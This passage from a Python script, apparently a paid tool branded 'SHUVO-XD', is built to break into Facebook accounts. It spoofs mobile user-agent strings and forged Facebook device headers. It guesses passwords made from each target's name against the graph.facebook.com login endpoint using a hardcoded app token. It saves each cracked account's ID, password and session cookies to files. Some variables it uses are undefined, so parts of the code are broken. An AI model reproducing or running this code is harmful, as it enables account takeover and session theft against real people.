   "Dalvik/2.1.0(Linux;v; Android;D6.0;LG_X230build/MRA58K)[FBAN/EMA;UNITY_PACKAGE/1826;FBBV/262675052.fbav/230.0.0.3.121;fbdv/lg_x230;fblc/es_ES,FBOP/20,fbng/wifi,fbcq/con.moblica,common x mob.protocol.data connectionQualitydata@48e505d8;fbmnt/not_metereo]",
   "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-J410G Build/M1AJB) [FBAN/Orca-Android;FBAV/291.2.0.22.114;FBPN/com.facebook.orca;FBLC/pt_BR;FBBV/257752740;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-J410G;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1384};FB_FW/1;]",
   "Dalvik/2.1.0 (Linux; U; Android 8.1.0; DUB-LX1 Build/HUAWEIDUB-LX1) [FBAN/Orca-Android;FBAV/291.2.0.22.114;FBPN/com.facebook.orca;FBLC/en_US;FBBV/257752740;FBCR/VIVACOM;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/DUB-LX1;FBSV/8.1.0;FBCA",
   "Dalvik/2.1.0 (Linux; U; Android 9; LM-X120 Build/PKQ1.180904.001) [FBAN/Orca-Android;FBAV/293.0.0.14.232;FBPN/com.facebook.orca;FBLC/en_CA;FBBV/261339538;FBCR/Lucky;FBMF/LGE;FBBD/lge;FBDV/LM-X120;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=480,height=888};FB_FW/1;]",
   "Dalvik/2.1.0 (Linux; U; Android 10; YAL-L21 Build/ HUAWEIYAL-L61) [FBAN/Orca- Android;FBAV/301.0.0.12.112;F BPN/com.facebook.orca;FBLC/ en_GB;FBBV/274784541;FBCR/ TM;FBMF/HUAWEI;FBBD/ HUAWEI;FBDV/YAL-L21;FBSV/ 10;FBCA/arm64-v8a:null;FBDM/ {density=2.55,width=1080,height =2110};FB_FW/1;]", 
   "Dalvik/2.1.0 (Linux; U; Android 5.1.1; Lenovo A6020a46 Build/LMY47V) [FBAN/Orca-Android;FBAV/251.0.0.12.117;FBPN/com.facebook.orca;FBLC/ru_RU;FBBV/197803937;FBCR/lifecell;FBMF/LENOVO;FBBD/Lenovo;FBDV/Lenovo A6020a46;FBSV/5.1.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]",
   "Dalvik/2.1.0 (Linux; U; Android 9; FIG-LX1 Build/HUAWEIFIG-L31) [FBAN/Orca-Android;FBAV/302.0.0.11.117;FBPN/com.facebook.orca;FBLC/es_ES;FBBV/275958904;FBCR/Yoigo;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/FIG-LX1;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2032};FB_FW/1;]",
   "Dalvik/2.1.0 (Linux; U; Android 9; Kirin Treble Build/PQ2A.190405.003) [FBAN/FB4A;FBAV/306.1.0.40.119;FBPN/com.facebook.katana;FBLC/ru_US;FBBV/273922298;FBCR/life:) BY;FBMF/HUAWEI;FBBD/Huawei;FBDV/Kirin Treble;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.4,width=1080,height=2075};FB_FW/1;FBRV/275142282;]",
   "Dalvik/2.1.0 (Linux; U; Android 11; SM-G973F Build/RP1A.200720.012) [FBAN/Orca-Android;FBAV/299.0.0.11.115;FBPN/com.facebook.orca;FBLC/de_DE;FBBV/272301973;FBCR/vodafone.de;FBMF/samsung;FBBD/samsung;FBDV/SM-G973F;FBSV/11;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2042};FB_FW/1;]",
   "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G925F Build/NRD90M) [FBAN/Orca-Android;FBAV/304.2.0.17.118;FBPN/com.facebook.orca;FBLC/ar_AE;FBBV/279457446;FBCR/Vodafone;FBMF/samsung;FBBD/samsung;FBDV/SM-G925F;FBSV/7.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=4.0,width=1440,height=2560};FB_FW/1;]",
   "Dalvik/2.1.0 (Linux; U; Android 7.1.2; SM-G955F Build/NRD90M) Source/1 [FBAN/EMA;UNITY_PACKAGE/749;FBBV/154200404;FBAV/146.0.0.9.102;FBDV/SM-G955F;FBLC/vi_VN;FBOP/20]",
   "Dalvik/2.1.0 (Linux; U; Android 10; SM-A515F Build/QP1A.190711.020) [FBAN/FB4A;FBAV/310.0.0.50.118;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/278533704;FBCR/airtel;FBMF/samsung;FBBD/samsung;FBDV/SM-A515F;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2186};FB_FW/1;FBRV/0;]",
   "Dalvik/2.1.0 (Linux; U; Android 10; SM-A515F Build/QP1A.190711.020) [FBAN/Orca-Android;FBAV/305.1.0.16.117;FBPN/com.facebook.orca;FBLC/en_GB;FBBV/280282233;FBCR/airtel;FBMF/samsung;FBBD/samsung;FBDV/SM-A515F;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2186};FB_FW/1;]",
   "Dalvik/2.1.0 (Linux; U; Android 5.1; HUAWEI LUA-L21 Build/HUAWEILUA-L21) [FBAN/MessengerLite;FBAV/133.0.0.1.116;FBPN/com.facebook.mlite;FBLC/cs_CZ;FBBV/279951921;FBCR/O2-CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/HUAWEI LUA-L21;FBSV/5.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=480,height=854};]",
   "Dalvik/2.1.0 (Linux; U; Android 5.1; HUAWEI LUA-L21 Build/HUAWEILUA-L21) [FBAN/EMA;UNITY_PACKAGE/2014;FBBV/282877419;FBAV/245.0.0.9.119;FBDV/HUAWEI LUA-L21;FBLC/cs_CZ;FBOP/20;FBNG/WIFI;FBMNT/NOT_METERED]",
   "Dalvik/2.1.0 (Linux; U; Android 10; SM-A515F Build/QP1A.190711.020) [FBAN/Orca-Android;FBAV/305.1.0.16.117;FBPN/com.facebook.orca;FBLC/en_GB;FBBV/280282233;FBCR/airtel;FBMF/samsung;FBBD/samsung;FBDV/SM-A515F;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2186};FB_FW/1;]",
   "Dalvik/2.1.0 (Linux; U; Android 8.0.0; ATU-L31 Build/HUAWEIATU-L31) [FBAN/MessengerLite;FBAV/126.0.0.1.117;FBPN/com.facebook.mlite;FBLC/cs_CZ;FBBV/271069048;FBCR/O2-CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/ATU-L31;FBSV/8.0.0;FBCA/arm64-v8a:null;FBDM/{density=2.0,width=720,height=1358};]",
   "Dalvik/2.1.0 (Linux; U; Android 8.0.0; ATU-L31 Build/HUAWEIATU-L31) [FBAN/MessengerLite;FBAV/126.0.0.1.117;FBPN/com.facebook.mlite;FBLC/cs_CZ;FBBV/271069048;FBCR/O2-CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/ATU-L31;FBSV/8.0.0;FBCA/arm64-v8a:null;FBDM/{density=2.0,width=720,height=1358};]", 
   "Dalvik/2.1.0 (Linux; U; Android 8.0.0; ATU-L31 Build/HUAWEIATU-L31) [FBAN/MessengerLite;FBAV/126.0.0.1.117;FBPN/com.facebook.mlite;FBLC/cs_CZ;FBBV/271069048;FBCR/O2-CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/ATU-L31;FBSV/8.0.0;FBCA/arm64-v8a:null;FBDM/{density=2.0,width=720,height=1358};]", 
   "Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]",
   "Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z016D;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]",
   "Dalvik/1.6.0 (Linux; U; Android 6.0; Build/MXB48T) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z016D;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]",
   "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J320F Build/LMY47V) [FBAN/FB4A;FBAV/43.0.0.29.147;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/14274161;FBCR/Tele2 LT;FBMF/samsung;FBBD/samsung;FBDV/SM-J320F;FBSV/5.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]",
   "Dalvik/1.6.0 (Linux; U; Android 4.4.2; SM-G3518 Build/JLS36C) [FBAN/FB4A;FBAV/251.0.0.31.111;FBPN/com.facebook.katana;FBLC/en_US;FBBV/188827991;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBDV/SM-G3518;FBSV/4.4.2;FBCA/x86:armeabi-v7a;FBDM/{density=1.5,width=720,height=1244};FB_FW/1;FBRV/190301973;]",
   "Dalvik/1.6.0 (Linux; U; Android 5; SM-G3518 Build/JLS36C) [FBAN/FB4A;FBAV/251.0.0.31.111;FBPN/com.facebook.katana;FBLC/en_US;FBBV/188827991;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBDV/SM-G3518;FBSV/4.4.2;FBCA/x86:armeabi-v7a;FBDM/{density=1.5,width=720,height=1244};FB_FW/1;FBRV/190301973;]",
   "Dalvik/2.1.0 (Linux; U; Android 9; SM-A505FM Build/PPR1.180610.011) [FBAN/FB4A;FBAV/327.0.0.33.120;FBPN/com.facebook.katana;FBLC/ru_RU;FBBV/304400854;FBCR/MegaFon;FBMF/samsung;FBBD/samsung;FBDV/SM-A505FM;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2131};FB_FW/1;FBRV/305275776;]",
   "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G930V Build/NRD90M) [FBAN/Orca-Android;FBAV/155.0.0.14.93;FBPN/com.facebook.orca;FBLC/en_US;FBBV/94098382;FBCR/Verizon Wireless;FBMF/samsung;FBBD/Verizon;FBDV/SM-G930V;FBSV/7.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1280};FB_FW/1;]",
   "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G930V Build/NRD90M) [FBAN/Orca-Android;FBAV/174.0.0.24.82;FBPN/com.facebook.orca;FBLC/en_US;FBBV/116802184;FBCR/Verizon Wireless;FBMF/samsung;FBBD/Verizon;FBDV/SM-G930V;FBSV/7.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]",
   "Dalvik/2.1.0 (Linux; U; Android 11; moto g(20) Build/RTAS31.68-20-2) [FBAN/Orca-Android;FBAV/336.0.0.13.142;FBPN/com.facebook.orca;FBLC/es_US;FBBV/327992372;FBCR/TELCEL;FBMF/motorola;FBBD/motorola;FBDV/moto g(20);FBSV/11;FBCA/arm64-v8a:null;FBDM/{density=1.75,width=720,height=1466};FB_FW/1;]",
   "Dalvik/2.1.0 (Linux; U; Android 11; SM-A115M Build/RP1A.200720.012) [FBAN/Orca-Android;FBAV/339.0.0.18.118;FBPN/com.facebook.orca;FBLC/es_US;FBBV/333752212;FBCR/TELCEL;FBMF/samsung;FBBD/samsung;FBDV/SM-A115M;FBSV/11;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.75,width=720,height=1411};FB_FW/1;]",
   "Dalvik/2.1.0 (Linux; U; Android 11; SM-G986U Build/RP1A.200720.012) [FBAN/Orca-Android;FBAV/316.4.0.15.120;FBPN/com.facebook.orca;FBLC/en_US;FBBV/297403762;FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBDV/SM-G986U;FBSV/11;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2201};FB_FW/1;]",
   "Dalvik/2.1.0 (Linux; U; Android 10; SM-A102U Build/QP1A.190711.020) [FBAN/Orca-Android;FBAV/342.1.0.14.119;FBPN/com.facebook.orca;FBLC/es_US;FBBV/339015010;FBCR/TELCEL;FBMF/samsung;FBBD/samsung;FBDV/SM-A102U;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1402};FB_FW/1;]",
   "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G930V Build/NRD90M) [FBAN/Orca-Android;FBAV/155.0.0.14.93;FBPN/com.facebook.orca;FBLC/en_US;FBBV/94098382;FBCR/Verizon Wireless;FBMF/samsung;FBBD/Verizon;FBDV/SM-G930V;FBSV/7.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1280};FB_FW/1;]",
   "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G930V Build/NRD90M) [FBAN/Orca-Android;FBAV/174.0.0.24.82;FBPN/com.facebook.orca;FBLC/en_US;FBBV/116802184;FBCR/Verizon Wireless;FBMF/samsung;FBBD/Verizon;FBDV/SM-G930V;FBSV/7.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]",
   "Dalvik/2.1.0 (Linux; U; Android 11; moto g(20) Build/RTAS31.68-20-2) [FBAN/Orca-Android;FBAV/336.0.0.13.142;FBPN/com.facebook.orca;FBLC/es_US;FBBV/327992372;FBCR/TELCEL;FBMF/motorola;FBBD/motorola;FBDV/moto g(20);FBSV/11;FBCA/arm64-v8a:null;FBDM/{density=1.75,width=720,height=1466};FB_FW/1;]",
   " Dalvik/2.1.0 (Linux; U; Android 11; SM-A115M Build/RP1A.200720.012) [FBAN/Orca-Android;FBAV/339.0.0.18.118;FBPN/com.facebook.orca;FBLC/es_US;FBBV/333752212;FBCR/TELCEL;FBMF/samsung;FBBD/samsung;FBDV/SM-A115M;FBSV/11;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.75,width=720,height=1411};FB_FW/1;]",
   "Dalvik/2.1.0 (Linux; U; Android 9; COL-L29 Build/HUAWEICOL-L29) [FBAN/Orca-Android;FBAV/314.1.0.19.119;FBPN/com.facebook.orca;FBLC/en_US;FBBV/293875204;FBCR/null;FBMF/HUAWEI;FBBD/HONOR;FBDV/COL-L29;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2201};FB_FW/1;]"]

# Print all predefined user agents
for agent in predefined_user_agents:
    print(agent)
# Add the generated random user agent to the predefined list
all_user_agents = [generate_random_user_agent()] + predefined_user_agents

# Randomly select a user agent
selected_user_agent = random.choice(all_user_agents)

# Print the selected user agent
print(selected_user_agent)
#-----------------------❲ HOST USER AGENT ❳-----------------------#
def ___sex___():
    version=random.choice(["14","15","10","13","7.0.0","7.1.1","9","12","11","9.0","8.0.0","7.1.2","7.0","4","5","4.4.2","5.1.1","6.0.1","9.0.1"])
    mix = random.choice(["SM-T835","SM-S901U","SM-S134DL","SM-J250F","SM-A217F","SM-A326B","SM-A125F","SM-A720F","SM-A326U","SM-G532M","SM-J410G","SM-A205GN","SM-A205GN","SM-A505GN","SM-G930F","SM-J210F","SM-N9005","SM-J210F","CPH2083","CPH2235", "CPH2499","CPH2185","CPH2065","CPH2197","CPH1989","CPH2145","F1w","CPH1909","CPH2065","CPH1937","CPH2095","CPH2083","CPH2249","CPH2083","CPH2239","CPH1979","CPH2067","CPH2069","CPH2239","CPH2015","CPH2021","CPH2205","CPH2069","CPH2161","CPH2207","CPH2239","CPH1909","CPH2185","CPH2127","CPH1923","CPH1931","PHN110", "CPH2599", "CPH2499", "CPH2557", "CPH8686", "CPH9177", "CPH9226", "OPPO F1 Plus", "CPH2071", "PCHM00", "CPH2083", "CPH2185", "CPH2179", "CPH2269", "CPH2421", "CPH2349", "CPH2271", "CPH2477", "CPH2471", "CPH2591", "CPH1923", "CPH1925", "CPH1837", "OPPO A30","RMX1945", "RMX1911", "RMX2193", "RMX1945", "RMX1931", "RMX2170", "RMX3201", "RMX2180", "RMX2021", "RMX2020", "RMX2155", "RMX1921", "RMX2156", "RMX3363", "RMX3081", "RMX2001", "RMX2001", "RMX3263", "RMX2155", "RMX2001", "RMX3195", "RMX1945", "RMX1945", "RMX1993","vi"+"vo 1901","V2"+"026","V20"+"58","viv"+"o 1716","vi"+"vo 1808","vi"+"vo 1935","vi"+"vo 1951","vi"+"vo 1906","vivo 1808","vivo 1920","vivo 1901", "V2026","V2058","vivo 1716","vivo 1935","vivo 1951","vivo 1906","V2111","vivo 1915","V1911A","V2036","vivo 1907","vivo 1906","vivo 1915","V2025","vivo 1820","vivo 1904","vivo 1901","V1955A","LG-H342","Redmi Note 4", "Redmi 4X", "Redmi 3", "Redmi 4", "Redmi 3X", "Redmi Note 7", "Redmi 6A", "Redmi Note 8 Pro", "Redmi 5A", "Redmi 5", "Redmi 6 Pro", "Redmi Note 5", "Redmi Note 4", "Redmi Y2", "Redmi 7A", "Redmi Note 7S", "Redmi Note 8T", "Redmi Note 8 Pro", "M2003J15SC", "Redmi 5 Plus", "Redmi Note 9 Pro", "Redmi Note 9S", "LDN-L21", "M2103K19G","RMX1945","RMX1911","RMX2193","RMX1945","RMX1931","RMX2170","RMX3201","RMX2180","RMX2021","RMX2020","RMX2155","RMX1921","RMX2156","RMX3363","RMX3081","RMX2001","RMX2001","RMX3263","RMX2155","RMX2001","RMX3195","RMX1945","RMX1945","RMX1993","RMX2180","RMX3630","RMX3686","RMX1805","RMX1801","RMX2020","RMX1811","RMX3063","RMX3516","RMX3371","RMX3461","RMX3286","RMX3561","RMX3388","RMX3311","RMX3142","RMX2071","RMX1805","RMX1809","RMX1801","RMX1807","RMX1803","RMX1825","RMX1821","RMX1822","RMX1833","RMX1851","RMX1853","RMX1827","RMX1911","RMX1919","RMX1927","RMX1971","RMX1973","RMX2030","RMX2032","RMX1925","RMX1929","RMX2001","RMX2061","RMX2063","RMX2040","RMX2042","RMX2002","RMX2151","RMX2163","RMX2155","RMX2170","RMX2103","RMX3085","RMX3241","RMX3081","RMX3151","RMX3381","RMX3521","RMX3474","RMX3471","RMX3472","RMX3392","RMX3393","RMX3491","RMX1811","RMX2185","RMX3231","RMX2189","RMX2180","RMX2195","RMX2101","RMX1941","RMX1945","RMX3063","RMX3061","RMX3201","RMX3203","RMX3261","RMX3263","RMX3193","RMX3191","RMX3195","RMX3197","RMX3265","RMX3268","RMX3269","RMX2027","RMX2020","RMX2021","RMX3581","RMX3501","RMX3503","RMX3511","RMX3310","RMX3312","RMX3551","RMX3301","RMX3300","RMX2202","RMX3363","RMX3360","RMX3366","RMX3361","RMX3031","RMX3370","RMX3357","RMX3560","RMX3562","RMX3350","RMX2193","RMX2161","RMX2050","RMX2156","RMX3242","RMX3171","RMX3430","RMX3235","RMX3506","RMX2117","RMX2173","RMX3161","RMX2205","RMX3462","RMX3478","RMX3372","RMX3574","RMX1831","RMX3121","RMX3122","RMX3125","RMX3043","RMX3042","RMX3041","RMX3092","RMX3093","RMX3571","RMX3475","RMX2200","RMX2201","RMX2111","RMX2112","RMX1901","RMX1903","RMX1992","RMX1993","RMX1991","RMX1931","RMX2142","RMX2081","RMX2085","RMX2083","RMX2086","RMX2144","RMX2051","RMX2025","RMX2075","RMX2076","RMX2072","RMX2052","RMX2176","RMX2121","RMX3115","RMX1921","vivo 1906","vivo 1904","vivo Y13L","vivo 1901","V2120","V2204","vivo 1902","V2310","V2333","vivo 1929","vivo 1915","vivo 1811","V2027","V2043","V2038","V2111","V2110","V2206","V2207","vivo Y23L","V2249","vivo 1613","vivo Y28L","vivo 1938","PADM00","CPH1837","PADT00","CPH1803","CPH1853","CPH1805","CPH1931","CPH1959","CPH1933","CPH1935","CPH1943","CPH1909","CPH1901","PDBM00","CPH1941","CPH2179","CPH2083","CPH2185","CPH2185","CPH2477","CPH2591","CHP2219","CPH1923","CPH2213","CPH1869", "CPH1929","CPH2107", "CPH2238", "CPH2389","CPH2401", "CPH2407", "CPH2413", "CPH2415", "CPH2417", "CPH2419", "CPH2455", "CPH2459", "CPH2461", "CPH2471", "CPH2473", "CPH2477", "CPH8893", "CPH2321", "CPH2341", "CPH2373", "CPH2083", "CPH2071", "CPH2077", "CPH2185", "CPH2179", "CPH2269", "CPH2421", "CPH2349", "CPH2271", "CPH1923", "CPH1925", "CPH1837", "CPH2015", "CPH2073", "CPH2081", "CPH2029", "CPH2031", "CPH2137", "CPH1605", "CPH1803", "CPH1853", "CPH1805", "CPH1809", "CPH1851", "CPH1931", "CPH1959", "CPH1933", "CPH1935", "CPH1943", "CPH2061", "CPH2069", "CPH2127", "CPH2131", "CPH2139", "CPH2135", "CPH2239", "CPH2195", "CPH2273", "CPH2325", "CPH2309", "CPH1701", "CPH2387", "CPH1909", "CPH1920", "CPH1912", "CPH1901", "CPH1903", "CPH1905", "CPH1717", "CPH1801", "CPH2067", "CPH2099", "CPH2161", "CPH2219", "CPH2197", "CPH2263", "CPH2375", "CPH2339", "CPH1715", "CPH2385", "CPH1729", "CPH1827", "CPH1938", "CPH1937", "CPH1939", "CPH1941", "CPH2001", "CPH2021", "CPH2059", "CPH2121", "CPH2123", "CPH2203", "CPH2333", "CPH2365", "CPH1913", "CPH1911", "CPH1915", "CPH1969", "CPH2209", "CPH1987", "CPH2095", "CPH2119", "CPH2285", "CPH2213", "CPH2223", "CPH2363", "CPH1609", "CPH1613", "CPH1723", "CPH1727", "CPH1725", "CPH1819", "CPH1821", "CPH1825", "CPH1881", "CPH1823", "CPH1871", "CPH1875", "CPH2023", "CPH2005", "CPH2025", "CPH2207", "CPH2173", "CPH2307", "CPH2305", "CPH2337", "CPH1955", "CPH1707", "CPH1719", "CPH1721", "CPH1835", "CPH1831", "CPH1833", "CPH1879", "CPH1893", "CPH1877", "CPH1607", "CPH1611", "CPH1917", "CPH1919", "CPH1907", "CPH1989", "CPH1945", "CPH1951", "CPH2043", "CPH2035", "CPH2037", "CPH2036", "CPH2009", "CPH2013", "CPH2113", "CPH2091", "CPH2125", "CPH2109", "CPH2089", "CPH2065", "CPH2159", "CPH2145", "CPH2205", "CPH2201", "CPH2199", "CPH2217", "CPH1921", "CPH2211", "CPH2235", "CPH2251", "CPH2249", "CPH2247", "CPH2237", "CPH2371", "CPH2293", "CPH2353", "CPH2343", "CPH2359", "CPH2357", "CPH2457", "CPH1983", "CPH1979"])
    build = random.choice(['MMB29Q','R16NW','LRX22C','R16NW','KTU84P','JLS36C','NJH47F','PPR1.180610.011','QP1A.190711.020','NRD90M','RP1A.200720.012','M1AJB','MMB29T'])
    ver = str(random.choice(range(77, 577)))
    ver2 = str(random.choice(range(57, 77)))
    return f'''Mozilla/5.0 (Linux; Android {version}; {model} Build/{build}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{ver2}.0.{ver}.8 Mobile Safari/537.36'''
#-----------------------❲ SYS ❳-----------------------#
sys.stdout.write('\x1b]2; >>SHUVO-XD<<\x07')
#-----------------------❲ COLOUR ❳-----------------------#
B = "\033[1;30m";
R = "\033[1;31m";
G = "\033[1;32m";
Y = "\033[1;33m";
BL = "\033[1;34m";
P = "\033[1;35m";
SK = "\033[1;36m";
W= '\033[1;37m'
#-----------------------❲ STYLE ❳-----------------------#
xd=f"{B}❲{G}•{B}❳{W}";xd1=f"{B}❲{G}1{B}❳{W}";xd2=f"{B}❲{G}2{B}❳{W}";xd3=f"{B}❲{G}3{B}❳{W}";xd4=f"{B}❲{G}4{B}❳{W}";xd5=f"{B}❲{G}5{B}❳{W}";xd6=f"{B}❲{G}6{B}❳{W}";xd0=f"{B}❲{G}0{B}❳{W}";xdx=f"{B}❲{G}?{B}❳{W}";xxdx=f"{R}";xxxxd=f"{SK}";xdxx=f"{G}━➤{G}"
#-----------------------❲ CLEAR ❳-----------------------#
def clear():os.system('clear');print(logo)
def linex():print(f'{W}──────────────────────────────────────────────────')
#-----------------------❲ LOGO ❳-----------------------#
logo=(f"""

   {Y} ██████  ██       █████   ██████ ██   ██ 
   {Y} ██   ██ ██      ██   ██ ██      ██  ██  
   {Y} ██████  ██      ███████ ██      █████   
   {Y} ██   ██ ██      ██   ██ ██      ██  ██  
   {Y} ██████  ███████ ██   ██  ██████ ██   ██  
  {P} version •••••••••••••••••••••••••     0.2 V                                     
{W}──────────────────────────────────────────────────
    {Y}, .  .  ,  ,-.  .   ,   ,-.  ,-.   ,-.  
    {Y}| |\ |  | /   \  \ /    |  ) |  ) /   \ 
    {Y}| | \|  | |   |   Y     |-<  |-<  |   | 
    {Y}| |  |  | \   /   |     |  ) |  \ \   / 
    {Y}' '  ' -'  `-'    '     `-'  '  '  `-'  {R} •••••🤫
{W}──────────────────────────────────────────────────
{xdxx} OWNER  {xdxx} SHUVO AHMED
{xdxx} TOOLS  {xdxx} FILE {G}X{G} RANDOM CLONING
{xdxx} STATUS {xdxx} PAID
{W}──────────────────────────────────────────────────""")
#-----------------------❲ RESULT ❳-----------------------#
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        print("");linex();print(f'{xdxx} THE PROCESS HAS BEEN COMPLETE...');print(f'{xdxx} TOTAL OK {xdxx} %s' % str(len(oks)));print(f'{xxdx} TOTAL CP {xxdx} %s' % str(len(cps)));linex();exit()
#-----------------------❲ MENU ❳-----------------------#
def ___SHUVO___():
        clear()
        print(f'{xd1} {G}FILE CLONING ');print(f'{xd2} {G}RANDOM CLONING ');print(f'{xd0} {G}EXIT CLONING ');linex()
        option = input(f'{xxdx} SELECT {xdxx} ')
        if option in ['1','A']:___file___()
        elif option in ['2','B']:___random___()
        else:print(f"{xd} OPTION NOT FOUND ");time.sleep(2);___SHUVO___()
#-----------------------❲ FILE INPUT ❳-----------------------#
class main_crack():
    def __init__(self):
        self.id=[]
    def crack(self,id):
        global methods
        clear();print(f"{xd} EXAMPLE {xdxx} /sdcard/SHUVO.txt");linex()
        self.file = input(f'{xdx} FILE NAME {xdxx} ')
        try:
            self.id = open(self.file).read().splitlines()
            self.pasw()
        except FileNotFoundError:
            linex();print(f'{xd} OPPS FILE NOT FOUND ');time.sleep(2);linex();print(f'{xd} TRY AGAIN ');time.sleep(2);main_crack().crack(id)
#-----------------------❲ FILE METHOD M1 ❳-----------------------#
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r{xd} SHUVO-M1 {loop}{G}|{W}{len(oks)}{G}|{W}{len(cps)} ")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            except:
                ls = fs
            for pw in psw:
                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                with requests.Session() as session:
                    data = {"adid": str(uuid.uuid4()),
                    "format": "json",
                    "device_id": str(uuid.uuid4()),
                    "cpl": "true",
                    "family_device_id": str(uuid.uuid4()),
                    "credentials_type": "device_based_login_password",
                    "error_detail_type": "button_with_disabled",
                    "source": "device_based_login",
                    "email": sid,"password": ps,
                    "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
                    "generate_session_cookies": "1",
                    "meta_inf_fbmeta": "",
                    "advertiser_id": str(uuid.uuid4()),
                    "currently_logged_in_userid": "0",
                    "locale": "en_GB",
                    "client_country_code": "GB",
                    "method": "auth.login",
                    "fb_api_req_friendly_name": "authenticate",
                    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                    "api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent': ___swag___(),
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                q = session.post("https://graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"
                    print(f"\r{xd}{G} SHUVO-OK {sid} | {ps} ")
                    print(f"\r{xd} COOKIES {cookie}");linex()
                    oks.append(sid)
                    open('/sdcard/SHUVO-M1-FILE-OK.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     print(f"\r{xd}{O} SHUVO-CP {sid} | {ps} ")
                     cps.append(sid)
                     open('/sdcard/SHUVO-M1-FILE-CP.txt','a').write(sid+'|'+ps+'\n')
                else:continue
            loop+=1
